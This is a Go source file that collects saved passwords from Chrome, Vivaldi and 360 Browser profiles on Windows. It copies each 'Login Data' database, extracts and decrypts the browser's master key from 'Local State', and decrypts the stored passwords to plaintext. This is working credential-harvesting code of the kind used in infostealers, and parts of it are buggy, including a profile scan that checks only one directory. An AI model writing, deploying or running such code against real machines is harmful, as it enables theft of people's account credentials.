package recovery_passwords
import(
	"os"
	"log"
	"errors"
	"strings"
	"regexp"
	"encoding/base64"
	"io/ioutil"
)

func GetAllProfiles(path string)([]string){
	var li []string
	li = append(li,path+"\\Default\\Login Data")
	li = append(li,path+"\\Login Data")
	exists_flag,err := PathExists(path)
	if err != nil{
		return li
	}else{
		if exists_flag != true {
			return li
		}else{
			dirs := GetDirectories(path)
			dirs_numbers := len(dirs)
			num_i := 0
			if num_i < dirs_numbers{
				dir := dirs[num_i]
				if strings.Index(dir,"Profile")>=0{
					li = append(li,dir+"\\Login data")
				}
				num_i += 1
			}
		}
	}
	return li
}

func Get_masker_key(parent_dir string)([]byte,error){
	local_state_dir := parent_dir + "\\Local State"
	exist_flag,_:=PathExists(local_state_dir)
	if exist_flag == true{
		local_state_bytes,err := ioutil.ReadFile(local_state_dir)
		if err == nil{
			local_state_str := string(local_state_bytes)
			regexp_str := regexp.MustCompile(`\"encrypted_key\":\"(.*?)\"`)
			if regexp_str != nil{
				encrypted_key_list := regexp_str.FindAllStringSubmatch(local_state_str,-1)
				if(len(encrypted_key_list)>0){
					if(len(encrypted_key_list[0])==2){
						encrypted_key := encrypted_key_list[0][1]
						if len(encrypted_key)>5{
							encrypted_bytes,err := base64.StdEncoding.DecodeString(encrypted_key)
							if err != nil{
								log.Fatalln(err)
								return []byte{},err
							}
							var array2 = make([]byte,len(encrypted_bytes)-5)
							copy(array2,encrypted_bytes[5:])
							master_key,err := WinDecypt(array2)
							if err != nil{
								log.Fatalln(err)
								return []byte{},err
							}
							return master_key,nil
						}
					}
				}
			}
		}
	}
	return []byte{},errors.New("Get_masker_key error")
}

func Decode_with_key(encryptedData []byte, masker_key []byte)(string,error){
	nounce := encryptedData[3:15]
	payload := encryptedData[15:]
	plain_pwd,err := AesGCMDecrypt(payload,masker_key,nounce)
	if err != nil{
		log.Println("Decode_with_key",err)
		return "", errors.New("AesGCMDecrypt error")
	}
	return string(plain_pwd),nil
}

//chrom版本大于等于v80
func recovery_passwords_frm_v80(dir_path string,Password_value []byte)(string){
	Password_value_str := ""
	parent_dir := dir_path[0:strings.LastIndex(dir_path,"\\")]
	parent_dir = parent_dir[0:strings.LastIndex(parent_dir,"\\")]
	masker_key,err := Get_masker_key(parent_dir)
	if (err == nil && len(masker_key)>0){
		Password_value_str,_ = Decode_with_key(Password_value,masker_key)
	}
	return Password_value_str
}

func recovery_passwords_chrome(brow_name string, brow_path string)([]Logins_table_struct){
	log.Println(brow_name)
	result := []Logins_table_struct{}
	dirs := GetAllProfiles(brow_path)
	for _,dir_path := range dirs{
		exist_flag,_ := PathExists(dir_path)
		if exist_flag == true{
			local_temp := "local_temp"
			CopyFile(dir_path,local_temp)
			Mysql,err := ConnectDB(local_temp)
			if err == nil{
				logins_table_struct_list,err := Mysql.ReadTable_chrome_Logins()
				if err == nil{
					for _,logins_table_struct := range logins_table_struct_list{
						if strings.HasPrefix(logins_table_struct.Password_value,"v10")|| strings.HasPrefix(logins_table_struct.Password_value,"v11"){
							logins_table_struct.Password_value = recovery_passwords_frm_v80(dir_path,[]byte(logins_table_struct.Password_value))
						}else{
							pwd,err := WinDecypt([]byte(logins_table_struct.Password_value))
							if err == nil{
								logins_table_struct.Password_value = string(pwd)
							}
						}
						result = append(result,logins_table_struct)
					}
				}
			}else{log.Println("mysql error")}
			Mysql.Close()
			os.Remove(local_temp)
		}else{
			log.Println("recovery_passwords_chrome error",dir_path)
		}
	}
	return result
}

func Recovery_passwords_chromes()(map[string][]Logins_table_struct){
	browser_map := make(map[string]Browser_info)
	browser_map["Vivaldi"] = Browser_info{Browser_path:Local_appdata+"\\Vivaldi\\User Data",Need_or_not_to_recovery:true}
	browser_map["Chrome"] = Browser_info{Browser_path:Local_appdata+"\\Google\\Chrome\\User Data",Need_or_not_to_recovery:true}
	browser_map["360 Browser"] = Browser_info{Browser_path:Local_appdata+"\\360Chrome\\Chrome\\User Data",Need_or_not_to_recovery:true}


	result_map := make(map[string][]Logins_table_struct)
	for k,v := range browser_map{
		if v.Need_or_not_to_recovery == true{
			result := recovery_passwords_chrome(k,v.Browser_path)
			if(len(result)>0){
				result_map[k]=result
			}
		}
	}
	return result_map
}